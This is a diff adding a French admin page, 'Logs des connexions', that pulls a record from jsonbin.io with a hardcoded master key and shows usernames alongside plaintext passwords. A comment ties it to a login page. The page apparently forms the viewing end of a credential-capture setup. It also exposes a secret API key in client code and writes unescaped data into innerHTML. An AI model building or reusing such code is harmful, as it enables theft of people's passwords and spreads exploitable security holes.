@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Admin - Logs</title>
+    <style>
+        table {
+            border-collapse: collapse;
+            width: 80%;
+            margin: 20px auto;
+            font-family: Arial, sans-serif;
+        }
+        th, td {
+            border: 2px solid #FF69B4;
+            padding: 10px;
+            text-align: left;
+        }
+        th {
+            background-color: #FF69B4;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <h1 style="text-align: center;">Logs des connexions</h1>
+    <div id="logs"></div>
+
+    <script>
+        const API_KEY = '$2a$10$1wewJFQyy/qyWMcrP0P4UeA4TUr1kK0bQC9VyMz9htOaRMDyz3sk2'; // Même que dans login.html
+        const BIN_ID = '679c8d12ad19ca34f8f7629b'; // Même que dans login.html
+
+        async function loadLogs() {
+            try {
+                const response = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
+                    headers: {
+                        'X-Master-Key': API_KEY
+                    }
+                });
+                
+                const data = await response.json();
+                displayLogs(data.record);
+            } catch (error) {
+                console.error('Erreur de chargement :', error);
+                document.getElementById('logs').innerHTML = 
+                    '<p style="color: red; text-align: center;">Erreur de chargement des logs</p>';
+            }
+        }
+
+        function displayLogs(logEntry) {
+            const logsDiv = document.getElementById('logs');
+            logsDiv.innerHTML = `
+                <table>
+                    <tr>
+                        <th>Date</th>
+                        <th>Username</th>
+                        <th>Password</th>
+                    </tr>
+                    <tr>
+                        <td>${new Date(logEntry.timestamp).toLocaleString()}</td>
+                        <td>${logEntry.username}</td>
+                        <td>${logEntry.password}</td>
+                    </tr>
+                </table>
+            `;
+        }
+
+        loadLogs();
+    </script>
+</body>
+</html>
